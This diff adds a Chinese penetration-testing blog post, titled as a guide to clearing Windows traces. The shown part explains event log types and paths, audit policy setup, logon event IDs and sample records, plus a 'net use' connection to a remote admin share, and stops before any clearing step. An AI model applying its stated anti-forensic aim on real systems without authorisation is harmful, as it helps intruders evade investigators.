@@ -1,0 +1,1000 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="August Rosenberg">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Windows日志简介Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。在渗透测试过程中，Windows日志往往会记录系统上的敏感操作，如添加用户，远程登录，执行命令等。攻击者通常会对Windows日志进行清除和绕过。 分类系统日志(System)记录操作系统组件产生的事件，主要包括">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windwos痕迹清楚">
+<meta property="og:url" content="https://tsy244.github.io/2024/02/18/%E6%B8%97%E9%80%8F/windwos%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/index.html">
+<meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="Windows日志简介Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。在渗透测试过程中，Windows日志往往会记录系统上的敏感操作，如添加用户，远程登录，执行命令等。攻击者通常会对Windows日志进行清除和绕过。 分类系统日志(System)记录操作系统组件产生的事件，主要包括">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218165217671.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218165230450.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218165303627.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218165343460.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218165853073.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218175006030.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218171723592.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218172124035.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218173742234.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218174226310.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218174250490.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218181810533.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218181903437.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218182112022.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218182258620.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218182343396.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218204413020.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218204628447.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218205534552.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218210839642.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218210636848.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218211301965.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218211356319.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218215813916.png">
+<meta property="article:published_time" content="2024-02-18T00:54:40.000Z">
+<meta property="article:modified_time" content="2024-02-18T14:10:13.622Z">
+<meta property="article:author" content="August Rosenberg">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218165217671.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>windwos痕迹清楚 - AU9U5T</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tsy244.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":"G-BL1W5LRRDJ","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>AU9U5T&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="windwos痕迹清楚"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        August Rosenberg
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-18 08:54" pubdate>
+          February 18, 2024 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          10k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          85 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">windwos痕迹清楚</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Windows日志"><a href="#Windows日志" class="headerlink" title="Windows日志"></a>Windows日志</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。在渗透测试过程中，Windows日志往往会记录系统上的敏感操作，如添加用户，远程登录，执行命令等。攻击者通常会对Windows日志进行清除和绕过。</p>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="系统日志-System"><a href="#系统日志-System" class="headerlink" title="系统日志(System)"></a>系统日志(System)</h3><p>记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows  NT&#x2F;2000操作系统预先定义。  </p>
+<p>默认日志路径： %SystemRoot%\System32\Winevt\Logs\System.evtx</p>
+<h3 id="应用程序日志-Application"><a href="#应用程序日志-Application" class="headerlink" title="应用程序日志(Application)"></a>应用程序日志(Application)</h3><p>包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监  视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。  </p>
+<p>默认日志路径：%SystemRoot%\System32\Winevt\Logs\Application.evtx</p>
+<h3 id="安全日志-Security"><a href="#安全日志-Security" class="headerlink" title="安全日志(Security)"></a>安全日志(Security)</h3><p>记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中  最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或 者在注册表中设置审核策略，以便当安全性日志满后使系  统停止响应。  </p>
+<p>默认日志路径：%SystemRoot%\System32\Winevt\Logs\Security.evtx  </p>
+<p>系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。  </p>
+<p>安全日志记录着事件审计信息，包括用户验证 （登录、远程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。  </p>
+<h2 id="查看系统日志"><a href="#查看系统日志" class="headerlink" title="查看系统日志"></a>查看系统日志</h2><h3 id="事件管理器"><a href="#事件管理器" class="headerlink" title="事件管理器"></a>事件管理器</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218165217671.png" srcset="/img/loading.gif" lazyload alt="image-20240218165217671"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218165230450.png" srcset="/img/loading.gif" lazyload alt="image-20240218165230450"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218165303627.png" srcset="/img/loading.gif" lazyload alt="image-20240218165303627"></p>
+<p>注意不同的操作系统可能名字可能不同</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218165343460.png" srcset="/img/loading.gif" lazyload alt="image-20240218165343460"></p>
+<p>可以直接搜搜</p>
+<p>说着直接使用win+r</p>
+<p>eventvwr.msc</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218165853073.png" srcset="/img/loading.gif" lazyload alt="image-20240218165853073"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218175006030.png" srcset="/img/loading.gif" lazyload alt="image-20240218175006030"></p>
+<h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 查看所有日志</span><br>powershell <span class="hljs-literal">-c</span> <span class="hljs-built_in">Get-winEvent</span><br><br><span class="hljs-comment"># 查看应用程序类别下的日志</span><br>powershell <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;Get-WinEvent -FilterHashtable @&#123;logname=&#x27;Application&#x27;;&#125;&quot;</span><br><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="保存地址"><a href="#保存地址" class="headerlink" title="保存地址"></a>保存地址</h2><blockquote>
+<p>C:\Windows\System32\winevt\Logs\  </p>
+<p>%systemroot%\System32\winevt\Logs\   </p>
+</blockquote>
+<h2 id="审核策略与事件查看器"><a href="#审核策略与事件查看器" class="headerlink" title="审核策略与事件查看器"></a>审核策略与事件查看器</h2><blockquote>
+<p>基本安全审核策略设置：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows/security/threat-protection/auditing/basic-security-audit-policy-settings">https://learn.microsoft.com/zh-cn/windows/security/threat-protection/auditing/basic-security-audit-policy-settings</a></p>
+</blockquote>
+<blockquote>
+<p>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p>
+</blockquote>
+<blockquote>
+<p>默认状态下，也会记录一些简单的日志，日志默认大小20M 设置</p>
+</blockquote>
+<p>添加其他安全设置</p>
+<p>  设置1：Win+R 输入 secpol.msc 打开本地安全策略 → 本地策略 → 审核策略，参考配置操作：  </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218171723592.png" srcset="/img/loading.gif" lazyload alt="image-20240218171723592"></p>
+<blockquote>
+<p>问题：设置完审核策略后，执行 gpupdate  &#x2F;force，更新组策略，导致策略自动消失。  </p>
+<p>解决方法：删除 C:\Windows\System32\GroupPolicy\Machine\Microsoft\Windows NT\Audit\ 文件夹下的.csv文件，即可</p>
+</blockquote>
+<p>发现没有这个就直接执行</p>
+<p>设置2：Win+R，输入 eventvwr.msc 进入事件查看器，设置合理的日志属性，即日志最大大小、事件覆盖阀值等：  </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218172124035.png" srcset="/img/loading.gif" lazyload alt="image-20240218172124035"></p>
+<p>常见登录事件日志分析  </p>
+<p>对于Windows事件日志分析，不同的EVENT  ID代表了不同的意义，摘录一些常见的安全事件的说明：  </p>
+<table>
+<thead>
+<tr>
+<th>事件id</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>4624</td>
+<td>登录成功</td>
+</tr>
+<tr>
+<td>4625</td>
+<td>登录失败</td>
+</tr>
+<tr>
+<td>4634</td>
+<td>注销成功</td>
+</tr>
+<tr>
+<td>4647</td>
+<td>用户自动的注销</td>
+</tr>
+<tr>
+<td>4672</td>
+<td>使用超级用户登录（管理员）</td>
+</tr>
+<tr>
+<td>4720</td>
+<td>创建用户</td>
+</tr>
+</tbody></table>
+<p>登录类型  </p>
+<blockquote>
+<p>  每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式：  </p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218173742234.png" srcset="/img/loading.gif" lazyload alt="image-20240218173742234"></p>
+<h3 id="本地交互式登录"><a href="#本地交互式登录" class="headerlink" title="本地交互式登录"></a>本地交互式登录</h3><p>这种方式就是最普通的登陆方式</p>
+<ol>
+<li><p>4648-4624-登录成功</p>
+<p> 首先是成功的登录，从日志分析来看至少会有2个事件发生，ID分别为 4648、4624，以下从上至下分别是各自的截图。</p>
+</li>
+</ol>
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218174226310.png" srcset="/img/loading.gif" lazyload alt="image-20240218174226310"></p>
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218174250490.png" srcset="/img/loading.gif" lazyload alt="image-20240218174250490"></p>
+<p>   首先是 ID 4648 事件，该事件说明有人使用身份凭据在尝试登录，并且头字段中的用户名为SYSTEM，看看描述信息中有什么：  </p>
+<blockquote>
+<p>试图使用显式凭据登录。</p>
+<p>主题:<br>    安全 ID:  SYSTEM<br>    帐户名:        PC$<br>    帐户域:        WORKGRUOP<br>    登录 ID:  0x3e7<br>    登录 GUID:    {00000000-0000-0000-0000-000000000000}</p>
+<p>使用了哪个帐户的凭据:<br>    帐户名:        Administrator<br>    帐户域:        PC<br>    登录 GUID:    {00000000-0000-0000-0000-000000000000}</p>
+<p>目标服务器:<br>    目标服务器名:localhost<br>    附加信息:   localhost</p>
+<p>进程信息:<br>    进程 ID:  0x630<br>    进程名:        C:\Windows\System32\winlogon.exe</p>
+<p>网络信息:<br>    网络地址:   127.0.0.1<br>    端口:     0</p>
+<p>在进程尝试通过显式指定帐户的凭据来登录该帐户时生成此事件。这通常发生在批量类型的配置中(例如计划任务) 或者使用 RUNAS 命令时。</p>
+</blockquote>
+<blockquote>
+<p>日志名称:        Security<br>来源:            Microsoft-Windows-Security-Auditing<br>日期:            2022&#x2F;9&#x2F;29 14:43:18<br>事件 ID:         4648<br>任务类别:        登录<br>级别:            信息<br>关键字:          审核成功<br>用户:            暂缺<br>计算机:          PC （目标机器名）</p>
+</blockquote>
+<p>   然后是4624 事件， 查看描述信息</p>
+<blockquote>
+<p>已成功登录帐户。</p>
+<p>主题:<br>    安全 ID:  SYSTEM<br>    帐户名:        PC$<br>    帐户域:        WORKGRUOP<br>    登录 ID:  0x3e7</p>
+<p>登录类型:        2</p>
+<p>新登录:<br>    安全 ID:  PC\Administrator<br>    帐户名:        Administrator<br>    帐户域:        PC<br>    登录 ID:  0x252938<br>    登录 GUID:    {00000000-0000-0000-0000-000000000000}</p>
+<p>进程信息:<br>    进程 ID:  0x630<br>    进程名:        C:\Windows\System32\winlogon.exe</p>
+<p>网络信息:<br>    工作站名:   PC<br>    源网络地址:  127.0.0.1<br>    源端口:        0</p>
+<p>详细身份验证信息:<br>    登录进程:       User32<br>    身份验证数据包:    Negotiate<br>    传递服务:   -<br>    数据包名(仅限 NTLM):  -<br>    密钥长度:       0</p>
+<p>在创建登录会话后在被访问的计算机上生成此事件。</p>
+<p>“主题”字段指明本地系统上请求登录的帐户。这通常是一个服务(例如 Server 服务)或本地进程(例如 Winlogon.exe 或 Services.exe)。</p>
+<p>“登录类型”字段指明发生的登录种类。最常见的类型是 2 (交互式)和 3 (网络)。</p>
+<p>“新登录”字段会指明新登录是为哪个帐户创建的，即登录的帐户。</p>
+<p>“网络”字段指明远程登录请求来自哪里。“工作站名”并非总是可用，而且在某些情况下可能会留为空白。</p>
+<p>“身份验证信息”字段提供关于此特定登录请求的详细信息。<br>    -“登录 GUID”是可以用于将此事件与一个 KDC 事件关联起来的唯一标识符。<br>    -“传递服务”指明哪些直接服务参与了此登录请求。<br>    - “数据包名”指明在 NTLM 协议之间使用了哪些子协议。<br>        -“密钥长度”指明生成的会话密钥的长度。如果没有请求会话密钥则此字段为 0。</p>
+</blockquote>
+<blockquote>
+<p>日志名称:        Security<br>来源:            Microsoft-Windows-Security-Auditing<br>日期:            2022&#x2F;9&#x2F;29 14:43:18<br>事件 ID:         4624<br>任务类别:        登录<br>级别:            信息<br>关键字:          审核成功<br>用户:            暂缺<br>计算机:          PC</p>
+</blockquote>
+<ol start="2">
+<li><p>如果是登录失败</p>
+<p>可以查看到对应的出错的原因</p>
+<blockquote>
+<p>帐户登录失败。</p>
+<p>主题:<br>    安全 ID:  SYSTEM<br>    帐户名:        PC$<br>    帐户域:        WORKGRUOP<br>    登录 ID:  0x3e7</p>
+<p>登录类型:        2</p>
+<p>登录失败的帐户:<br>    安全 ID:  NULL SID<br>    帐户名:        Administrator<br>    帐户域:        PC</p>
+<p>失败信息:<br>    失败原因:   未知用户名或密码错误。<br>    状态:     0xc000006d<br>    子状态:        0xc000006a</p>
+<p>进程信息:<br>    调用方进程 ID:   0x630<br>    调用方进程名: C:\Windows\System32\winlogon.exe</p>
+<p>网络信息:<br>    工作站名:   PC<br>    源网络地址:  127.0.0.1<br>    源端口:        0</p>
+<p>详细身份验证信息:<br>    登录进程:       User32<br>    身份验证数据包:    Negotiate<br>    传递服务:   -<br>    数据包名(仅限 NTLM):  -<br>    密钥长度:       0</p>
+<p>登录请求失败时在尝试访问的计算机上生成此事件。</p>
+</blockquote>
+<blockquote>
+<p>日志名称:        Security<br>来源:            Microsoft-Windows-Security-Auditing<br>日期:            2022&#x2F;9&#x2F;29 14:43:15<br>事件 ID:         4625<br>任务类别:        登录<br>级别:            信息<br>关键字:          审核失败<br>用户:            暂缺<br>计算机:          PC</p>
+</blockquote>
+</li>
+</ol>
+<h3 id="RDP协议远程登录"><a href="#RDP协议远程登录" class="headerlink" title="RDP协议远程登录"></a>RDP协议远程登录</h3><ol>
+<li><p>4648-4624-4672-登录成功</p>
+<p>  使用mstsc远程登录某个主机时，使用的帐户是管理员帐户的话，成功的情况下会有ID为4648、4624、4672的事件产生。  </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218181810533.png" srcset="/img/loading.gif" lazyload alt="image-20240218181810533"></p>
+<p>10 代表了交互性</p>
+</li>
+<li><p>4625-登录失败</p>
+</li>
+</ol>
+<p>   登录事件 ID为 4625  </p>
+<p>   登录类型为 10（远程交互）</p>
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218181903437.png" srcset="/img/loading.gif" lazyload alt="image-20240218181903437"></p>
+<h3 id="连接共享文件夹"><a href="#连接共享文件夹" class="headerlink" title="连接共享文件夹"></a>连接共享文件夹</h3><p>远程访问某台主机的共享资源，如某个共享文件夹  </p>
+<ol>
+<li>2624-登录成功</li>
+</ol>
+<blockquote>
+<p>使用正确的用户名和密码访问远程共享主机，登录事件ID为4624，登录类型为3（Network），审核成功。列出了源网络地址端口。  </p>
+</blockquote>
+   <figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">net <span class="hljs-keyword">use</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">81.169</span>\c<span class="hljs-variable">$ </span>/<span class="hljs-symbol">user:</span>administrator<br></code></pre></td></tr></table></figure>
+
+<p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windows%E7%97%95%E8%BF%B9%E6%B8%85%E6%A5%9A/image-20240218182112022.png" srcset="/img/loading.gif" lazyload alt="image-20240218182112022"></p>
+<p>   如果访问共享资源使用的帐户名、密码正确，但是该用户对指定的共享文件夹没有访问权限时仍然会有ID为4624的认证成功事件生。  </p>
+<ol start="2">
+<li>2625-登录失败</li>
+</ol>
+<blockquote>
+<p>  登录失败 事件ID 4625  登录类型 3  </p>
